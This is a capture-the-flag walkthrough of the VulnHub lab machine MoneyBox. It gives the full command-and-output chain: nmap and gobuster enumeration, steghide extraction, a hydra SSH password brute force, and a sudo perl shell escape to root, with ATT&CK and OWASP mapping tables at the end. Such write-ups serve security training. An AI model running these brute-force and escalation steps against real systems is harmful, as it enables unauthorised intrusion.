
## MoneyBox


| **Platform**   | VulnHub     |
| -------------- | ----------- |
| **Machine**    | MoneyBox: 1 |
| **Creator**    | Kirthik_T   |
| **OS**         | Linux       |
| **Difficulty** | Easy        |


use `netdiscover` to find the VM, then run `Nmap`.


~~~
nmap -sC -sV 10.0.2.27
~~~


| Port | Service | Details                                        | Additional information                                                                                                           |
| ---- | ------- | ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| 21   | ftp     | vsftpd 3.0.3                                   | ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>\|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg |
| 22   | SSH     | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |                                                                                                                                  |
| 80   | http    | Apache httpd 2.4.38 ((Debian))                 |                                                                                                                                  |


go to the website on port 80, and fire up `gobuster` to enumerate the directories.

in **/blogs/**,  in the page source we see a hint: 

`<!--the hint is the another secret directory is S3cr3t-T3xt-->`

visit that directory, check the source to get a key: 

~~~
<!..Secret Key 3xtr4ctd4t4 >
~~~

 get the image from `ftp` via anonymous login, and extract data from it using `steghide` and the passphrase found earlier.

~~~
steghide extract -sf /home/m0th/trytofind.jpg
Enter passphrase: 
wrote extracted data to "data.txt".

cat data.txt       
Hello.....  renu
 I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
 
~~~

 
it contains a username, which can be used to bruteforce `ssh` via `hydra`.

 
~~~
 hydra -l renu -P /usr/share/wordlists/rockyou.txt  -t 4 10.0.2.27 ssh
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
[22][ssh] host: 10.0.2.27   login: renu   password: 987654321
1 of 1 target successfully completed, 1 valid password found
~~~

now we can get the first user flag.

**renu**'s public key is in user **lily**'s **authorized_keys**, which means we can use `ssh` to transition into **lily**, and get the second user flag. 

next, check **lily**'s permissions:

`User lily may run the following commands on MoneyBox:`
    `(ALL : ALL) NOPASSWD: /usr/bin/perl`


use perl with sudo to [spawn an interactive shell](https://gtfobins.org/gtfobins/perl/) and get the root flag.

~~~
lily@MoneyBox:/usr/bin$ sudo perl -e 'exec "/bin/bash"'
root@MoneyBox:/usr/bin# 
~~~


#### MITRE ATT&CK Mapping

| **Actions**             | **Step**                                      | **Technique**                                                      |
| ----------------------- | --------------------------------------------- | ------------------------------------------------------------------ |
| Service discovery       | Scan with Nmap                                | T1595 Active scanning                                              |
| Web content discovery   | Directory enumeration with Gobuster           | T1595.003 Active Scanning: Wordlist Scanning                       |
| Access hidden directory | Access `/S3cr3t-T3xt/`                        | T1594  Search Victim-Owned Websites                                |
| Credential Access       | Use `hydra` to bruteforce the password        | T1110.001 Brute Force: Password Guessing                           |
| Initial Access          | ssh as renu                                   | T1078.003 Valid Accounts: Local Accounts                           |
| Lateral Movement        | ssh as lily@localhost                         | T1078.003 Valid Accounts: Local Accounts                           |
| Privilege Escalation    | use perl with sudo to spawn interactive shell | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching |


#### OWASP Vulnerability Table

| **Vulnerability**         | **Impact**                                                                    |
| ------------------------- | ----------------------------------------------------------------------------- |
| Security Misconfiguration | bruteforce-able credentials;<br>process used with sudo to spawn shell as root |
